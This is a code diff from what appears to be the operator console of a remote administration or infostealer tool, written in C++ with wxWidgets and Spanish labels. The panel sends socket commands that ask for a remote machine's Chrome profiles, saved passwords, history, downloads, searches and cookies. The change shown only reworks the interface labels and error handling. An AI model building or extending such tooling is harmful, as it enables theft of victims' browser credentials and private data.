@@ -13,45 +13,47 @@ panelInfoChrome::panelInfoChrome(wxWindow* pParent, SOCKET sck_socket)
 	
 	this->sckSocket = sck_socket;
 
-	wxButton* btn_perfiles = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Lista de perfiles");
-	wxButton* btn_passwords = new wxButton(this, EnumChromeInfoIDS::BTN_Passwords, "Contraseñas");
-	wxButton* btn_historialn = new wxButton(this, EnumChromeInfoIDS::BTN_HistorialN, "Historial");
-	wxButton* btn_historiald = new wxButton(this, EnumChromeInfoIDS::BTN_HistorialD, "Descargas");
-	wxButton* btn_searcht = new wxButton(this, EnumChromeInfoIDS::BTN_Busquedas, "Busquedas");
-	wxButton* btn_cookies = new wxButton(this, EnumChromeInfoIDS::BTN_Cookies, "Cookies");
+	wxButton* btn_perfiles   = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Lista de perfiles");
+	wxButton* btn_passwords  = new wxButton(this, EnumChromeInfoIDS::BTN_Passwords,      "Contraseñas");
+	wxButton* btn_historialn = new wxButton(this, EnumChromeInfoIDS::BTN_HistorialN,       "Historial");
+	wxButton* btn_historiald = new wxButton(this, EnumChromeInfoIDS::BTN_HistorialD,       "Descargas");
+	wxButton* btn_searcht    = new wxButton(this, EnumChromeInfoIDS::BTN_Busquedas,        "Busquedas");
+	wxButton* btn_cookies    = new wxButton(this, EnumChromeInfoIDS::BTN_Cookies,            "Cookies");
 
 	this->m_CrearListCtrls();
 
 	wxBoxSizer* main_sizer = new wxBoxSizer(wxHORIZONTAL);
 	
 	wxBoxSizer* btns_sizer = new wxBoxSizer(wxVERTICAL);
-	btns_sizer->Add(btn_perfiles, 1, wxEXPAND | wxALL, 1);
-	btns_sizer->Add(btn_passwords, 1, wxEXPAND | wxALL, 1);
+	btns_sizer->Add(btn_perfiles,   1, wxEXPAND | wxALL, 1);
+	btns_sizer->Add(btn_passwords,  1, wxEXPAND | wxALL, 1);
 	btns_sizer->Add(btn_historialn, 1, wxEXPAND | wxALL, 1);
 	btns_sizer->Add(btn_historiald, 1, wxEXPAND | wxALL, 1);
-	btns_sizer->Add(btn_searcht, 1, wxEXPAND | wxALL, 1);
-	btns_sizer->Add(btn_cookies, 1, wxEXPAND | wxALL, 1);
+	btns_sizer->Add(btn_searcht,    1, wxEXPAND | wxALL, 1);
+	btns_sizer->Add(btn_cookies,    1, wxEXPAND | wxALL, 1);
+
+	//https://wiki.wxwidgets.org/Scrolling
 
 	wxFlexGridSizer* grid = new wxFlexGridSizer(6, 2, 0, 0);
 
-	grid->Add(new wxStaticText(this, wxID_ANY, "Usuarios"));
-	grid->Add(new wxStaticText(this, wxID_ANY, "Contraseñas"));
-	grid->Add(listCtrlUsers, 1, wxEXPAND, 1);
-	grid->Add(listCtrlPasswords, 1, wxEXPAND, 1);
+	grid->Add(this->lblUsers);
+	grid->Add(this->lblPasswords);
+	grid->Add(listCtrlUsers, 1, wxEXPAND | wxALL, 1);
+	grid->Add(listCtrlPasswords, 1, wxEXPAND | wxALL, 1);
 
-	grid->Add(new wxStaticText(this, wxID_ANY, "Historial de Navegacion"), 0);
-	grid->Add(new wxStaticText(this, wxID_ANY, "Historial de Descarga"), 0);
+	grid->Add(this->lblHistorialN);
+	grid->Add(this->lblHistorialD);
 	grid->Add(listCtrlHistorialN, 1, wxEXPAND | wxALL, 1);
 	grid->Add(listCtrlHistorialD, 1, wxEXPAND | wxALL, 1);
 	
 	
-	grid->Add(new wxStaticText(this, wxID_ANY, "Busquedas"));
-	grid->Add(new wxStaticText(this, wxID_ANY, "Cookies"));
+	grid->Add(this->lblSearchT);
+	grid->Add(this->lblCookies);
 	grid->Add(listCtrlSearchT, 1, wxEXPAND | wxALL, 1);
 	grid->Add(listCtrlCookies, 1, wxEXPAND | wxALL, 1);
 
-	main_sizer->Add(btns_sizer);
-	main_sizer->Add(grid, 1, wxEXPAND | wxALL, 2);
+	main_sizer->Add(btns_sizer, 0, wxEXPAND | wxALL, 1);
+	main_sizer->Add(grid, 1, wxEXPAND | wxALL, 1);
 
 	this->SetSizer(main_sizer);
 }
@@ -69,38 +71,44 @@ void panelInfoChrome::OnProcesarBoton(wxCommandEvent& event) {
 	switch (evento) {
 		case EnumChromeInfoIDS::BTN_Profiles:
 			this->listCtrlUsers->DeleteAllItems();
+			this->lblUsers->SetLabelText("Usuarios: " + this->GetSelectedUserName());
 			iComando = EnumComandos::INF_Chrome_Profiles;
 			strPaquete = "  ";
 			break;
 		case EnumChromeInfoIDS::BTN_Passwords:
 			this->listCtrlPasswords->DeleteAllItems();
+			this->lblPasswords->SetLabelText("Contraseñas: " + this->GetSelectedUserName());
 			strPaquete.append(1, '1');
 			break;
 		case EnumChromeInfoIDS::BTN_HistorialN:
 			this->listCtrlHistorialN->DeleteAllItems();
+			this->lblHistorialN->SetLabelText("Historial de Navegacion: " + this->GetSelectedUserName());
 			strPaquete.append(1, '2');
 			break;
 		case EnumChromeInfoIDS::BTN_HistorialD:
 			this->listCtrlHistorialD->DeleteAllItems();
+			this->lblHistorialD->SetLabelText("Historial de Descargas: " + this->GetSelectedUserName());
 			strPaquete.append(1, '3');
 			break;
 		case EnumChromeInfoIDS::BTN_Busquedas:
 			this->listCtrlSearchT->DeleteAllItems();
+			this->lblSearchT->SetLabelText("Busquedas: " + this->GetSelectedUserName());
 			strPaquete.append(1, '4');
 			break;
 		case EnumChromeInfoIDS::BTN_Cookies:
 			this->listCtrlCookies->DeleteAllItems();
+			this->lblCookies->SetLabelText("Cookies: " + this->GetSelectedUserName());
 			strPaquete.append(1, '5');
 			break;
 		default:
-			this->listCtrlUsers->DeleteAllItems();
-			strPaquete = "  ";
 			break;
 	}
 	
 	if (iComando != 0 && strPaquete.size() > 1) {
 		p_Servidor->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, iComando);
-	}	
+	}else {
+		wxMessageBox("No se ha seleccionado un usuario", "Error", 5L, this);
+	}
 }
 
 std::string panelInfoChrome::GetSelectedUserPath() {
@@ -112,7 +120,23 @@ std::string panelInfoChrome::GetSelectedUserPath() {
 	return strOut;
 }
 
+std::string panelInfoChrome::GetSelectedUserName() {
+	std::string strOut = "";
+	long item = this->listCtrlUsers->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
+	if (item != wxNOT_FOUND) {
+		strOut = this->listCtrlUsers->GetItemText(item, 1);
+	}
+	return strOut;
+}
+
 void panelInfoChrome::m_CrearListCtrls() {
+	this->lblUsers      = new wxStaticText(this, wxID_ANY,                "Usuarios");
+	this->lblPasswords  = new wxStaticText(this, wxID_ANY,             "Contraseñas");
+	this->lblHistorialN = new wxStaticText(this, wxID_ANY, "Historial de Navegacion");
+	this->lblHistorialD = new wxStaticText(this, wxID_ANY,  "Historial de Descargas");
+	this->lblSearchT    = new wxStaticText(this, wxID_ANY,               "Busquedas");
+	this->lblCookies    = new wxStaticText(this, wxID_ANY,                 "Cookies");
+
 	this->listCtrlUsers      = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
 	this->listCtrlPasswords  = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
 	this->listCtrlHistorialN = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
